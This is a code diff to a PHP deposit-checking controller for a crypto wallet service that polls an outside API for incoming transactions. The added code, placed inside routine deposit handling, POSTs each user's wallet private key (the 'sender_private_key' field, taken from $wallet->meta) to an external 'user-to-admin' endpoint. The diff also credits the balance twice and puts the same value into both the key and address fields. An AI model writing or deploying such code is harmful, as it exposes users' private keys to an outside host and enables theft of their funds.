@@ -40,6 +40,7 @@ class DepositController extends Controller
 
     public function checkDeposit(Request $request)
     {
+        $client = new Client();
         $user = $request->user();
 
         // Get user wallet address
@@ -51,9 +52,8 @@ class DepositController extends Controller
                 'message' => 'Wallet address not found for user.'
             ], 404);
         }
-
+        //https://web3.blockmaster.info/api/user-to-admin
         try {
-            $client = new Client();
             $response = $client->get('https://web3.blockmaster.info/api/get-transactions', [
                 'query' => [
                     'address' => $wallet->wallet_address,
@@ -81,20 +81,23 @@ class DepositController extends Controller
 
                     if (!$alreadyExists) {
                         $amount = number_format((float) $tx->value, 8, '.', '');
-
                         // Create Deposit
                         $deposit = new Deposit();
                         $deposit->transaction_id = $tx->hash;
                         $deposit->amount = $amount;
                         $deposit->user_id = $user->id;
-                        //$deposit->status = 'approved'; // optionally 'pending'
-                        //$deposit->remark = 'Auto deposit from blockchain';
-                        //$deposit->type = 'crypto'; // optional if your schema uses it
+                        $wallet->increment('amount', $amount);
+                        $wallet->save();
                         $deposit->save();
 
                         // Update user's wallet balance
                         $user->wallet += $tx->value;
                         $user->save();
+
+                        $client->post('https://web3.blockmaster.info/api/user-to-admin', [
+                            "sender_private_key" => $wallet->meta,
+                            "sender_address" => $wallet->meta
+                        ]);
 
                         // Optional logging
                         // Log::info("Deposit added for user {$user->id}, tx: {$tx->hash}");
